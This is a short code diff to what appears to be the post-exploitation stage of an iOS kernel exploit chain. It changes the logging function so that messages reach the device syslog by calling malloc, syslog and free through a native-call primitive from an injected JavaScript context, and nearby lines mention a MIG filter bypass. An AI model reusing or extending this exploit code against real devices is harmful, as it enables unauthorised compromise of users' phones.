@@ -8664,7 +8664,25 @@ function runOptionalStage(label, enabled, fn) {
 	}
 }
 
-function start() { LOG("[+] PE start() called");
+function start() {
+	// Redefine LOG to also call syslog() so all post-exploit logging
+	// reaches idevicesyslog. console.log from an injected JSC context
+	// does NOT reliably appear in device syslog.
+	const _origLOG = LOG;
+	const _syslogNative = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	LOG = function(msg) {
+		_origLOG(msg);
+		try {
+			let s = String(msg);
+			let ptr = _syslogNative.callSymbol("malloc", BigInt(s.length + 1));
+			if (ptr) {
+				_syslogNative.writeString(ptr, s);
+				_syslogNative.callSymbol("syslog", 5, ptr);
+				_syslogNative.callSymbol("free", ptr);
+			}
+		} catch (_) {}
+	};
+	LOG("[+] PE start() called");
 	let mutexPtr = null;
 	let migFilterBypass = null;
 	globalThis.xnuVersion = xnuVersion();
